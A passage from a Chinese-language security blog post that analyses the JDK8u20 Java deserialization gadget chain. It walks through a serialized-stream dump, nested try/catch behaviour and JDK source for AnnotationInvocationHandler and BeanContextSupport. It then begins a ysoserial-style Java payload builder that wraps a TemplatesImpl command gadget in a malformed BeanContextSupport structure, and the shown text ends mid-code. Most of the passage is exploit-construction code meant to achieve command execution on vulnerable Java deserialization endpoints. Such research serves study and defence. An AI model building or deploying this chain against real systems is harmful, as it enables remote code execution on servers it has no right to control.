            @Length - 9 - 0x00 09
            @Value - threshold - 0x74 68 72 65 73 68 6f 6c 64
      []ClassAnnotations
        TC_ENDBLOCKDATA - 0x78
      @SuperClassDesc
        TC_NULL - 0x70
    @Handler - 8257537
    []ClassData
      @ClassName - java.util.HashMap
        {}Attributes
          loadFactor
            (float)0.75 - 0x3f 40 00 00
          threshold
            (integer)12 - 0x00 00 00 0c
        @ObjectAnnotation
          TC_BLOCKDATA - 0x77
            @Blockdata - 0x00 00 00 10 00 00 00 01
          TC_OBJECT - 0x73
            TC_CLASSDESC - 0x72
              @ClassName
                @Length - 29 - 0x00 1d
                @Value - ysoserial.test.Others.Student - 0x79 73 6f 73 65 72 69 61 6c 2e 74 65 73 74 2e 4f 74 68 65 72 73 2e 53 74 75 64 65 6e 74
              @SerialVersionUID - -8584469818678980313 - 0x88 dd d6 2e b0 93 d1 27
              @Handler - 8257538
              @ClassDescFlags - SC_SERIALIZABLE - 0x02
              @FieldCount - 1 - 0x00 01
              []Fields
                Index 0:
                  Object - L - 0x4c
                  @FieldName
                    @Length - 4 - 0x00 04
                    @Value - Name - 0x4e 61 6d 65
                  @ClassName
                    TC_STRING - 0x74
                      @Handler - 8257539
                      @Length - 18 - 0x00 12
                      @Value - Ljava/lang/String; - 0x4c 6a 61 76 61 2f 6c 61 6e 67 2f 53 74 72 69 6e 67 3b
              []ClassAnnotations
                TC_ENDBLOCKDATA - 0x78
              @SuperClassDesc
                TC_NULL - 0x70
            @Handler - 8257540
            []ClassData
              @ClassName - ysoserial.test.Others.Student
                {}Attributes
                  Name
                    TC_STRING - 0x74
                      @Handler - 8257541
                      @Length - 6 - 0x00 06
                      @Value - bridge - 0x62 72 69 64 67 65
          TC_REFERENCE - 0x71
            @Handler - 8257540 - 0x00 7e 00 04
          TC_ENDBLOCKDATA - 0x78
</code></pre><p>可以看到在第二个Student（也就是value）用Handler指向了8257540，也就是第一个Student</p>
<h2 id="多重try-catch">多重try catch</h2>
<p>同样先从一个demo说起</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">static</span> <span style="color:#8be9fd">void</span> <span style="color:#50fa7b">tryCatch</span><span style="color:#ff79c6">(){</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">try</span> <span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span>        <span style="color:#8be9fd">int</span> i <span style="color:#ff79c6">=</span> 2 <span style="color:#ff79c6">/</span> 1<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">try</span> <span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span>            <span style="color:#8be9fd">int</span> j <span style="color:#ff79c6">=</span> 2 <span style="color:#ff79c6">/</span> 0<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span>            System<span style="color:#ff79c6">.</span><span style="color:#50fa7b">out</span><span style="color:#ff79c6">.</span><span style="color:#50fa7b">println</span><span style="color:#ff79c6">(</span><span style="color:#f1fa8c">&#34;Inner End&#34;</span><span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">}</span> <span style="color:#ff79c6">catch</span> <span style="color:#ff79c6">(</span>Exception e<span style="color:#ff79c6">)</span> <span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span>            System<span style="color:#ff79c6">.</span><span style="color:#50fa7b">out</span><span style="color:#ff79c6">.</span><span style="color:#50fa7b">println</span><span style="color:#ff79c6">(</span><span style="color:#f1fa8c">&#34;Inner Error&#34;</span><span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">}</span>
</span></span><span style="display:flex;"><span>        System<span style="color:#ff79c6">.</span><span style="color:#50fa7b">out</span><span style="color:#ff79c6">.</span><span style="color:#50fa7b">println</span><span style="color:#ff79c6">(</span><span style="color:#f1fa8c">&#34;Outer End&#34;</span><span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">}</span> <span style="color:#ff79c6">catch</span> <span style="color:#ff79c6">(</span>Exception e<span style="color:#ff79c6">)</span> <span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span>        System<span style="color:#ff79c6">.</span><span style="color:#50fa7b">out</span><span style="color:#ff79c6">.</span><span style="color:#50fa7b">println</span><span style="color:#ff79c6">(</span><span style="color:#f1fa8c">&#34;Outer Error&#34;</span><span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">}</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">}</span>
</span></span></code></pre></div><p>运行结果：</p>
<pre tabindex="0"><code>Inner Error
Outer End
</code></pre><p>可以看出，多层try catch的内层代码抛出异常时，内层代码会中断，但是外层代码会继续执行下去。</p>
<h2 id="jdk8u20链分析">JDK8U20链分析</h2>
<p>上述两个trick单独看作用不大，但是结合起来就会有奇妙的效果。再看修复后的AnnotationInvocationHandler</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">private</span> <span style="color:#8be9fd">void</span> <span style="color:#50fa7b">readObject</span><span style="color:#ff79c6">(</span>ObjectInputStream var1<span style="color:#ff79c6">)</span> <span style="color:#8be9fd;font-style:italic">throws</span> IOException<span style="color:#ff79c6">,</span> ClassNotFoundException <span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span>    var1<span style="color:#ff79c6">.</span><span style="color:#50fa7b">defaultReadObject</span><span style="color:#ff79c6">();</span>
</span></span><span style="display:flex;"><span>    AnnotationType var2 <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">null</span><span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">try</span> <span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span>        var2 <span style="color:#ff79c6">=</span> AnnotationType<span style="color:#ff79c6">.</span><span style="color:#50fa7b">getInstance</span><span style="color:#ff79c6">(</span><span style="color:#ff79c6">this</span><span style="color:#ff79c6">.</span><span style="color:#50fa7b">type</span><span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">}</span> <span style="color:#ff79c6">catch</span> <span style="color:#ff79c6">(</span>IllegalArgumentException var9<span style="color:#ff79c6">)</span> <span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">throw</span> <span style="color:#ff79c6">new</span> InvalidObjectException<span style="color:#ff79c6">(</span><span style="color:#f1fa8c">&#34;Non-annotation type in annotation serial stream&#34;</span><span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">}</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#6272a4">// ...
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">}</span>
</span></span></code></pre></div><p>如果把AnnotationInvocationHandler#readObject当成内层try catch嵌套在外层try catch中，反序列化的时候会在内存中留下完整的AnnotationInvocationHandler和对应的handler。而此后在真正需要用到AnnotationInvocationHandler的时候，ObjectInputStream会直接引用这个handler。</p>
<p>所以需要找到一个readObject流程里有try catch且不影响反序列化流程的类。</p>
<p>如<code>java.beans.beancontext.BeanContextSupport</code></p>
<p>BeanContextSupport#readObject</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">private</span> <span style="color:#8be9fd;font-style:italic">synchronized</span> <span style="color:#8be9fd">void</span> <span style="color:#50fa7b">readObject</span><span style="color:#ff79c6">(</span>ObjectInputStream ois<span style="color:#ff79c6">)</span> <span style="color:#8be9fd;font-style:italic">throws</span> IOException<span style="color:#ff79c6">,</span> ClassNotFoundException <span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">synchronized</span><span style="color:#ff79c6">(</span>BeanContext<span style="color:#ff79c6">.</span><span style="color:#50fa7b">globalHierarchyLock</span><span style="color:#ff79c6">)</span> <span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span>        ois<span style="color:#ff79c6">.</span><span style="color:#50fa7b">defaultReadObject</span><span style="color:#ff79c6">();</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        initialize<span style="color:#ff79c6">();</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        bcsPreDeserializationHook<span style="color:#ff79c6">(</span>ois<span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">if</span> <span style="color:#ff79c6">(</span>serializable <span style="color:#ff79c6">&gt;</span> 0 <span style="color:#ff79c6">&amp;&amp;</span> <span style="color:#ff79c6">this</span><span style="color:#ff79c6">.</span><span style="color:#50fa7b">equals</span><span style="color:#ff79c6">(</span>getBeanContextPeer<span style="color:#ff79c6">()))</span>
</span></span><span style="display:flex;"><span>            readChildren<span style="color:#ff79c6">(</span>ois<span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        deserialize<span style="color:#ff79c6">(</span>ois<span style="color:#ff79c6">,</span> bcmListeners <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">new</span> ArrayList<span style="color:#ff79c6">(</span>1<span style="color:#ff79c6">));</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">}</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">}</span>
</span></span></code></pre></div><p>BeanContextSupport#readChildren</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">public</span> <span style="color:#8be9fd;font-style:italic">final</span> <span style="color:#8be9fd">void</span> <span style="color:#50fa7b">readChildren</span><span style="color:#ff79c6">(</span>ObjectInputStream ois<span style="color:#ff79c6">)</span> <span style="color:#8be9fd;font-style:italic">throws</span> IOException<span style="color:#ff79c6">,</span> ClassNotFoundException <span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd">int</span> count <span style="color:#ff79c6">=</span> serializable<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">while</span> <span style="color:#ff79c6">(</span>count<span style="color:#ff79c6">--</span> <span style="color:#ff79c6">&gt;</span> 0<span style="color:#ff79c6">)</span> <span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span>        Object                      child <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">null</span><span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span>        BeanContextSupport<span style="color:#ff79c6">.</span><span style="color:#50fa7b">BCSChild</span> bscc  <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">null</span><span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">try</span> <span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span>            child <span style="color:#ff79c6">=</span> ois<span style="color:#ff79c6">.</span><span style="color:#50fa7b">readObject</span><span style="color:#ff79c6">();</span>
</span></span><span style="display:flex;"><span>            bscc  <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">(</span>BeanContextSupport<span style="color:#ff79c6">.</span><span style="color:#50fa7b">BCSChild</span><span style="color:#ff79c6">)</span>ois<span style="color:#ff79c6">.</span><span style="color:#50fa7b">readObject</span><span style="color:#ff79c6">();</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">}</span> <span style="color:#ff79c6">catch</span> <span style="color:#ff79c6">(</span>IOException ioe<span style="color:#ff79c6">)</span> <span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">continue</span><span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">}</span> <span style="color:#ff79c6">catch</span> <span style="color:#ff79c6">(</span>ClassNotFoundException cnfe<span style="color:#ff79c6">)</span> <span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">continue</span><span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">}</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#6272a4">// ...
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span><span style="color:#ff79c6">}</span>
</span></span></code></pre></div><p>让<code>child = ois.readObject();</code>这一行读取AnnotationInvocationHandler，之后的catch并不影响反序列化流程，完美符合要求。</p>
<p>于是接下来的思路就很明确了：在最终LinkedHashSet中依次add三个元素：包裹AnnotationInvocationHandler的BeanContextSupport、templates、proxy。</p>
<p>先看看为了使<code>child = ois.readObject();</code>读取想要的AnnotationInvocationHandler需要做什么</p>
<p>BeanContextSupport#writeObject</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">private</span> <span style="color:#8be9fd;font-style:italic">synchronized</span> <span style="color:#8be9fd">void</span> <span style="color:#50fa7b">writeObject</span><span style="color:#ff79c6">(</span>ObjectOutputStream oos<span style="color:#ff79c6">)</span> <span style="color:#8be9fd;font-style:italic">throws</span> IOException<span style="color:#ff79c6">,</span> ClassNotFoundException <span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span>    serializing <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">true</span><span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">synchronized</span> <span style="color:#ff79c6">(</span>BeanContext<span style="color:#ff79c6">.</span><span style="color:#50fa7b">globalHierarchyLock</span><span style="color:#ff79c6">)</span> <span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">try</span> <span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span>            oos<span style="color:#ff79c6">.</span><span style="color:#50fa7b">defaultWriteObject</span><span style="color:#ff79c6">();</span> <span style="color:#6272a4">// serialize the BeanContextSupport object
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>
</span></span><span style="display:flex;"><span>            bcsPreSerializationHook<span style="color:#ff79c6">(</span>oos<span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">if</span> <span style="color:#ff79c6">(</span>serializable <span style="color:#ff79c6">&gt;</span> 0 <span style="color:#ff79c6">&amp;&amp;</span> <span style="color:#ff79c6">this</span><span style="color:#ff79c6">.</span><span style="color:#50fa7b">equals</span><span style="color:#ff79c6">(</span>getBeanContextPeer<span style="color:#ff79c6">()))</span>
</span></span><span style="display:flex;"><span>                writeChildren<span style="color:#ff79c6">(</span>oos<span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            serialize<span style="color:#ff79c6">(</span>oos<span style="color:#ff79c6">,</span> <span style="color:#ff79c6">(</span>Collection<span style="color:#ff79c6">)</span>bcmListeners<span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">}</span> <span style="color:#ff79c6">finally</span> <span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span>            serializing <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">false</span><span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">}</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">}</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">}</span>
</span></span></code></pre></div><p>BeanContextSupport#writeChildren</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">public</span> <span style="color:#8be9fd;font-style:italic">final</span> <span style="color:#8be9fd">void</span> <span style="color:#50fa7b">writeChildren</span><span style="color:#ff79c6">(</span>ObjectOutputStream oos<span style="color:#ff79c6">)</span> <span style="color:#8be9fd;font-style:italic">throws</span> IOException <span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">if</span> <span style="color:#ff79c6">(</span>serializable <span style="color:#ff79c6">&lt;=</span> 0<span style="color:#ff79c6">)</span> <span style="color:#ff79c6">return</span><span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd">boolean</span> prev <span style="color:#ff79c6">=</span> serializing<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    serializing <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">true</span><span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd">int</span> count <span style="color:#ff79c6">=</span> 0<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">synchronized</span><span style="color:#ff79c6">(</span>children<span style="color:#ff79c6">)</span> <span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span>        Iterator i <span style="color:#ff79c6">=</span> children<span style="color:#ff79c6">.</span><span style="color:#50fa7b">entrySet</span><span style="color:#ff79c6">().</span><span style="color:#50fa7b">iterator</span><span style="color:#ff79c6">();</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">while</span> <span style="color:#ff79c6">(</span>i<span style="color:#ff79c6">.</span><span style="color:#50fa7b">hasNext</span><span style="color:#ff79c6">()</span> <span style="color:#ff79c6">&amp;&amp;</span> count <span style="color:#ff79c6">&lt;</span> serializable<span style="color:#ff79c6">)</span> <span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span>            Map<span style="color:#ff79c6">.</span><span style="color:#50fa7b">Entry</span> entry <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">(</span>Map<span style="color:#ff79c6">.</span><span style="color:#50fa7b">Entry</span><span style="color:#ff79c6">)</span>i<span style="color:#ff79c6">.</span><span style="color:#50fa7b">next</span><span style="color:#ff79c6">();</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">if</span> <span style="color:#ff79c6">(</span>entry<span style="color:#ff79c6">.</span><span style="color:#50fa7b">getKey</span><span style="color:#ff79c6">()</span> <span style="color:#ff79c6">instanceof</span> Serializable<span style="color:#ff79c6">)</span> <span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span>                <span style="color:#ff79c6">try</span> <span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span>                    oos<span style="color:#ff79c6">.</span><span style="color:#50fa7b">writeObject</span><span style="color:#ff79c6">(</span>entry<span style="color:#ff79c6">.</span><span style="color:#50fa7b">getKey</span><span style="color:#ff79c6">());</span>   <span style="color:#6272a4">// child
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>                    oos<span style="color:#ff79c6">.</span><span style="color:#50fa7b">writeObject</span><span style="color:#ff79c6">(</span>entry<span style="color:#ff79c6">.</span><span style="color:#50fa7b">getValue</span><span style="color:#ff79c6">());</span> <span style="color:#6272a4">// BCSChild
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4"></span>                <span style="color:#ff79c6">}</span> <span style="color:#ff79c6">catch</span> <span style="color:#ff79c6">(</span>IOException ioe<span style="color:#ff79c6">)</span> <span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span>                    serializing <span style="color:#ff79c6">=</span> prev<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span>                    <span style="color:#ff79c6">throw</span> ioe<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span>                <span style="color:#ff79c6">}</span>
</span></span><span style="display:flex;"><span>                count<span style="color:#ff79c6">++;</span>
</span></span><span style="display:flex;"><span>            <span style="color:#ff79c6">}</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">}</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">}</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    serializing <span style="color:#ff79c6">=</span> prev<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">if</span> <span style="color:#ff79c6">(</span>count <span style="color:#ff79c6">!=</span> serializable<span style="color:#ff79c6">)</span> <span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">throw</span> <span style="color:#ff79c6">new</span> IOException<span style="color:#ff79c6">(</span><span style="color:#f1fa8c">&#34;wrote different number of children than expected&#34;</span><span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span>    <span style="color:#ff79c6">}</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">}</span>
</span></span></code></pre></div><p>BeanContextSupport.children</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span>    <span style="color:#6272a4">/**
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4">     * all accesses to the &lt;code&gt; protected HashMap children &lt;/code&gt; field
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4">     * shall be synchronized on that object.
</span></span></span><span style="display:flex;"><span><span style="color:#6272a4">     */</span>
</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">protected</span> <span style="color:#8be9fd;font-style:italic">transient</span> HashMap         children<span style="color:#ff79c6">;</span>
</span></span></code></pre></div><p>所以让BeanContextSupport.children=AnnotationInvocationHandler即可。</p>
<p>当然，因为children写入的时候极其地不合规范，为后面无限debug埋下了伏笔。</p>
<p>构造畸形的反序列化有很多种方法，在经过了很多的尝试之后，我认为<a href="https://tttang.com/archive/1729/">1nhann师傅的方法</a>最自然和精炼。</p>
<p>正常想法直接add</p>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#282a36;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-java" data-lang="java"><span style="display:flex;"><span><span style="color:#ff79c6">package</span> ysoserial.test.payloads<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> javassist.ClassPool<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> javassist.CtClass<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> javassist.CtMethod<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> org.apache.commons.io.FileUtils<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> ysoserial.payloads.util.Gadgets<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> ysoserial.payloads.util.Reflections<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> ysoserial.payloads.util.ByteUtils<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> java.beans.beancontext.BeanContextSupport<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> java.io.File<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> java.lang.reflect.InvocationHandler<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> java.util.HashMap<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> java.util.LinkedHashSet<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> javax.xml.transform.Templates<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> ysoserial.Serializer<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span><span style="color:#ff79c6">import</span> ysoserial.Deserializer<span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#8be9fd;font-style:italic">public</span> <span style="color:#8be9fd;font-style:italic">class</span> <span style="color:#50fa7b">Temp</span> <span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#8be9fd;font-style:italic">public</span> <span style="color:#8be9fd;font-style:italic">static</span> Object <span style="color:#50fa7b">getObject</span><span style="color:#ff79c6">(</span><span style="color:#8be9fd;font-style:italic">final</span> String command<span style="color:#ff79c6">)</span> <span style="color:#8be9fd;font-style:italic">throws</span> Exception <span style="color:#ff79c6">{</span>
</span></span><span style="display:flex;"><span>        <span style="color:#8be9fd;font-style:italic">final</span> Object templates <span style="color:#ff79c6">=</span> Gadgets<span style="color:#ff79c6">.</span><span style="color:#50fa7b">createTemplatesImpl</span><span style="color:#ff79c6">(</span>command<span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        String zeroHashCodeStr <span style="color:#ff79c6">=</span> <span style="color:#f1fa8c">&#34;f5a5a608&#34;</span><span style="color:#ff79c6">;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        HashMap map <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">new</span> HashMap<span style="color:#ff79c6">();</span>
</span></span><span style="display:flex;"><span>        map<span style="color:#ff79c6">.</span><span style="color:#50fa7b">put</span><span style="color:#ff79c6">(</span>zeroHashCodeStr<span style="color:#ff79c6">,</span> <span style="color:#f1fa8c">&#34;foo&#34;</span><span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        InvocationHandler tempHandler <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">(</span>InvocationHandler<span style="color:#ff79c6">)</span> Reflections<span style="color:#ff79c6">.</span><span style="color:#50fa7b">getFirstCtor</span><span style="color:#ff79c6">(</span>
</span></span><span style="display:flex;"><span>            Gadgets<span style="color:#ff79c6">.</span><span style="color:#50fa7b">ANN_INV_HANDLER_CLASS</span>
</span></span><span style="display:flex;"><span>        <span style="color:#ff79c6">).</span><span style="color:#50fa7b">newInstance</span><span style="color:#ff79c6">(</span>Override<span style="color:#ff79c6">.</span><span style="color:#50fa7b">class</span><span style="color:#ff79c6">,</span> map<span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span>        Reflections<span style="color:#ff79c6">.</span><span style="color:#50fa7b">setFieldValue</span><span style="color:#ff79c6">(</span>tempHandler<span style="color:#ff79c6">,</span> <span style="color:#f1fa8c">&#34;type&#34;</span><span style="color:#ff79c6">,</span> Templates<span style="color:#ff79c6">.</span><span style="color:#50fa7b">class</span><span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span>        Templates proxy <span style="color:#ff79c6">=</span> Gadgets<span style="color:#ff79c6">.</span><span style="color:#50fa7b">createProxy</span><span style="color:#ff79c6">(</span>tempHandler<span style="color:#ff79c6">,</span> Templates<span style="color:#ff79c6">.</span><span style="color:#50fa7b">class</span><span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        BeanContextSupport support <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">new</span> BeanContextSupport<span style="color:#ff79c6">();</span>
</span></span><span style="display:flex;"><span>        HashMap childrenMap <span style="color:#ff79c6">=</span> <span style="color:#ff79c6">new</span> HashMap<span style="color:#ff79c6">();</span>
</span></span><span style="display:flex;"><span>        childrenMap<span style="color:#ff79c6">.</span><span style="color:#50fa7b">put</span><span style="color:#ff79c6">(</span>tempHandler<span style="color:#ff79c6">,</span> 0<span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span>        Reflections<span style="color:#ff79c6">.</span><span style="color:#50fa7b">setFieldValue</span><span style="color:#ff79c6">(</span>support<span style="color:#ff79c6">,</span> <span style="color:#f1fa8c">&#34;children&#34;</span><span style="color:#ff79c6">,</span> childrenMap<span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span>        Reflections<span style="color:#ff79c6">.</span><span style="color:#50fa7b">setFieldValue</span><span style="color:#ff79c6">(</span>support<span style="color:#ff79c6">,</span> <span style="color:#f1fa8c">&#34;serializable&#34;</span><span style="color:#ff79c6">,</span> 1<span style="color:#ff79c6">);</span>
</span></span><span style="display:flex;"><span>
